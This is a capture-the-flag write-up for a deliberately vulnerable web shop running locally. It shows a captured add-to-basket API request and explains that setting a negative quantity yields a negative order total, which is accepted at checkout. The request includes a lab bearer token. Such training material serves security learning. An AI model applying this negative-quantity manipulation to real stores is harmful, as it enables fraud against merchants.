# Payback Time

**Difficulty**: :star2::star2::star2:

**Description**: Place an order that makes you rich.

**Category**: Improper Input Validation

**Tags**:

**Solution**:

I inspected the request after adding items to the basket:

<details>
<summary>Add item request</summary>

```
POST /api/BasketItems/ HTTP/1.1
Accept: application/json, text/plain, */*
Accept-Encoding: gzip, deflate, br
Accept-Language: en,en-US;q=0.9
Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MjEsInVzZXJuYW1lIjoiIiwiZW1haWwiOiJ0aWVudmluaC5kdW9uZzRAZ21haWwuY29tIiwicGFzc3dvcmQiOiI4MjdjY2IwZWVhOGE3MDZjNGMzNGExNjg5MWY4NGU3YiIsInJvbGUiOiJjdXN0b21lciIsImRlbHV4ZVRva2VuIjoiIiwibGFzdExvZ2luSXAiOiIwLjAuMC4wIiwicHJvZmlsZUltYWdlIjoiL2Fzc2V0cy9wdWJsaWMvaW1hZ2VzL3VwbG9hZHMvZGVmYXVsdC5zdmciLCJ0b3RwU2VjcmV0IjoiIiwiaXNBY3RpdmUiOnRydWUsImNyZWF0ZWRBdCI6IjIwMjItMDctMjEgMTM6NTI6MzkuNDYxICswMDowMCIsInVwZGF0ZWRBdCI6IjIwMjItMDctMjEgMTM6NTI6MzkuNDYxICswMDowMCIsImRlbGV0ZWRBdCI6bnVsbH0sImlhdCI6MTY1ODQxMTU2OSwiZXhwIjoxNjU4NDI5NTY5fQ.sjcN_BJX47dDpi4h_j55YnFv5c8Pa4ViQ7F9d6fcFAdzCSwvmKjMrkNKyM8pAEN8O7fA5xYIAWOKDGWiDlglC3Y0g5vlWlCj1vhpcGF2uB7x6uhBFdNv8lBddAchk4BMkk6HyyxKz38iAw8q6BGavC9oCsEqpIBLoSOgEaSsJBA
Connection: keep-alive
Content-Length: 44
Content-Type: application/json
Cookie: language=en
DNT: 1
Host: localhost:3000
Origin: http://localhost:3000
Referer: http://localhost:3000/
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36
sec-ch-ua: ".Not/A)Brand";v="99", "Google Chrome";v="103", "Chromium";v="103"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Linux"

{
  "ProductId": 24,
  "BasketId": "6",
  "quantity": 1
}
```

</details>

![example request to add items to basket](https://user-images.githubusercontent.com/64480713/180234565-35c5a644-26c2-4002-a0a9-17fee21dd20a.png)

So I tried to change `quantity` to `-1111` so the money we pay would be **negative**, and the request was processed successfully :exclamation::

![successful request](https://user-images.githubusercontent.com/64480713/180235026-5357f075-ef27-4c39-8059-90c08a16891f.png)

Let's check the basket:

![current basket](https://user-images.githubusercontent.com/64480713/180235385-7d09df77-5f2c-496f-b5c4-d547b894b1f9.png)

Then check out the order:

![checkout](https://user-images.githubusercontent.com/64480713/180235726-b60edfe1-f1e2-4768-8ae6-a4be9622f466.png)

Result:

![result](https://user-images.githubusercontent.com/64480713/180235812-14bf7b69-f00e-4124-9a61-5b60f2c197e6.png)
